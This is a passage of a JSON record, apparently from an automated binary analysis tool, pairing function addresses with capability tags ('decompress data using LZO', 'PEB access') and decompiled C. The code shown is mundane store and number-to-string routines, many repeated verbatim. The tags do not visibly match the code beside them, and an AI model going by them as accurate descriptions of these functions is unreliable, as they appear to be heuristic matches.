        "decompiled_code": "\nuint __fastcall fcn.00452571(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.0043eeb9(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x0045258d:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.0044ac12();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.0045f1b5();\n            if (iVar3 == 0) {\ncode_r0x004525a8:\n                iVar3 = *(param_1 + 8);\n                *(iVar3 + 0x1c) = 1;\n                *(iVar3 + 0x18) = 0x16;\n                fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                goto code_r0x0045258d;\n            }\n            iVar3 = fcn.0045027c(*(param_1 + 0x28));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004525a8;\n                iVar3 = *(param_1 + 0x14);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x2c) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 463
    },
    "0045261e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0045261e(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x00452638:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x00452638;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 479
    },
    "004526a3": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004526a3(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x004526bd:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x004526bd;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 479
    },
    "00452728": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452728(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.0043ef47(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x00452744:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.0044ac28();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.0045f1b5();\n            if (iVar3 == 0) {\ncode_r0x0045275f:\n                iVar3 = *(param_1 + 8);\n                *(iVar3 + 0x1c) = 1;\n                *(iVar3 + 0x18) = 0x16;\n                fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                goto code_r0x00452744;\n            }\n            iVar3 = fcn.0045027c(*(param_1 + 0x28));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x0045275f;\n                iVar3 = *(param_1 + 0x14);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x2c) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 460
    },
    "004527d5": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004527d5(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x004527ef:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x004527ef;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 479
    },
    "0045285a": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0045285a(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x00452874:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x00452874;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 479
    },
    "004528df": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004528df(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.0043efd5(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004528fb:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.0044ac3e();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.0045f1b5();\n            if (iVar3 == 0) {\ncode_r0x00452916:\n                iVar3 = *(param_1 + 8);\n                *(iVar3 + 0x1c) = 1;\n                *(iVar3 + 0x18) = 0x16;\n                fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                goto code_r0x004528fb;\n            }\n            iVar3 = fcn.0045027c(*(param_1 + 0x28));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x00452916;\n                iVar3 = *(param_1 + 0x14);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x2c) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 459
    },
    "0045298c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0045298c(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x004529a6:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x004529a6;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 481
    },
    "00452a11": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00452a11(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x00452a2b:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x00452a2b;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 483
    },
    "00452a96": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452a96(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.0043f064(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x00452ab2:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.0044ac54();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.0045f1b5();\n            if (iVar3 == 0) {\ncode_r0x00452acd:\n                iVar3 = *(param_1 + 8);\n                *(iVar3 + 0x1c) = 1;\n                *(iVar3 + 0x18) = 0x16;\n                fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                goto code_r0x00452ab2;\n            }\n            iVar3 = fcn.0045027c(*(param_1 + 0x28));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x14);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x00452acd;\n                iVar3 = *(param_1 + 0x14);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x2c) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 461
    },
    "00452b43": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00452b43(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x00452b5d:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x00452b5d;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 483
    },
    "0043467f": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043467f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint arg_8h_00;\n    char *pcVar3;\n    char *arg_8h_01;\n    int64_t iVar4;\n    uint var_24h;\n    uint var_1dh;\n    char acStack13 [5];\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    acStack13[2] = 0;\n    bVar1 = false;\n    arg_8h_01 = acStack13 + 2;\n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch < 1) && (iVar4 = CONCAT44(arg_ch, arg_8h),  arg_ch < 0)) {\n        bVar1 = true;\n        iVar4 = CONCAT44(-(arg_ch + (arg_8h != 0)), -arg_8h);\n    }\n    do {\n        pcVar3 = arg_8h_01;\n        arg_8h_00 = iVar4 >> 0x20;\n        arg_8h_01 = pcVar3 + -1;\n        cVar2 = fcn.00476c70(iVar4, 10, 0);\n        *arg_8h_01 = cVar2 + '0';\n        iVar4 = fcn.00476c00();\n    } while (iVar4 != 0);\n    if (bVar1) {\n        arg_8h_01 = pcVar3 + -2;\n        *arg_8h_01 = '-';\n    }\n    fcn.0043434e(arg_8h_01, acStack13 + (2 - arg_8h_01));\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 451
    },
    "00434712": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434712(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *in_ECX;\n    uint arg_8h_00;\n    uint *arg_8h_01;\n    int64_t iVar2;\n    uint var_20h;\n    uchar uStack13;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_8h._0_1_ = 0;\n    arg_8h_01 = &var_8h;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    do {\n        arg_8h_00 = iVar2 >> 0x20;\n        arg_8h_01 = arg_8h_01 + -1;\n        cVar1 = fcn.00476c70(iVar2, 10, 0);\n        *arg_8h_01 = cVar1 + '0';\n        iVar2 = fcn.00476c00();\n    } while (iVar2 != 0);\n    fcn.0043434e(arg_8h_01, &var_8h - arg_8h_01);\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 315
    },
    "00444389": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444389(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    pcVar3 = iVar1 + -1 + iVar4;\n    *(in_ECX + 0x30) = pcVar3;\n    pcVar2 = pcVar3;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *pcVar2 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar2 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar3 - pcVar2;\n    *(in_ECX + 0x30) = pcVar2 + 1;\n    return;\n}\n",
        "token_count": 327
    },
    "004443ec": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004443ec(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    pcVar3 = iVar1 + -1 + iVar4;\n    *(in_ECX + 0x30) = pcVar3;\n    pcVar2 = pcVar3;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *pcVar2 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar2 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar3 - pcVar2;\n    *(in_ECX + 0x30) = pcVar2 + 1;\n    return;\n}\n",
        "token_count": 327
    },
    "0044444f": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044444f(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    pcVar3 = iVar1 + -1 + iVar4;\n    *(in_ECX + 0x30) = pcVar3;\n    pcVar2 = pcVar3;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *pcVar2 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar2 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar3 - pcVar2;\n    *(in_ECX + 0x30) = pcVar2 + 1;\n    return;\n}\n",
        "token_count": 328
    },
    "004444b2": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004444b2(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    pcVar3 = iVar1 + -1 + iVar4;\n    *(in_ECX + 0x30) = pcVar3;\n    pcVar2 = pcVar3;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *pcVar2 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar2 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar3 - pcVar2;\n    *(in_ECX + 0x30) = pcVar2 + 1;\n    return;\n}\n",
        "token_count": 328
    },
    "00444515": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444515(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    pcVar3 = iVar1 + -1 + iVar4;\n    *(in_ECX + 0x30) = pcVar3;\n    pcVar2 = pcVar3;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *pcVar2 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar2 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar3 - pcVar2;\n    *(in_ECX + 0x30) = pcVar2 + 1;\n    return;\n}\n",
        "token_count": 327
    },
    "00444578": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444578(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    pcVar3 = iVar1 + -1 + iVar4;\n    *(in_ECX + 0x30) = pcVar3;\n    pcVar2 = pcVar3;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *pcVar2 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar2 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar3 - pcVar2;\n    *(in_ECX + 0x30) = pcVar2 + 1;\n    return;\n}\n",
        "token_count": 327
    },
    "004445db": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004445db(uint32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar2 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar3 = piVar1;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *piVar3 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar1 - piVar3 >> 1;\n    *(in_ECX + 0x30) = piVar3 + 1;\n    return;\n}\n",
        "token_count": 354
    },
    "0044464e": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044464e(uint32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar2 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar3 = piVar1;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *piVar3 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar1 - piVar3 >> 1;\n    *(in_ECX + 0x30) = piVar3 + 1;\n    return;\n}\n",
        "token_count": 355
    },
    "004446c1": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004446c1(uint32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar2 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar3 = piVar1;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *piVar3 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar1 - piVar3 >> 1;\n    *(in_ECX + 0x30) = piVar3 + 1;\n    return;\n}\n",
        "token_count": 355
    },
    "00444734": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
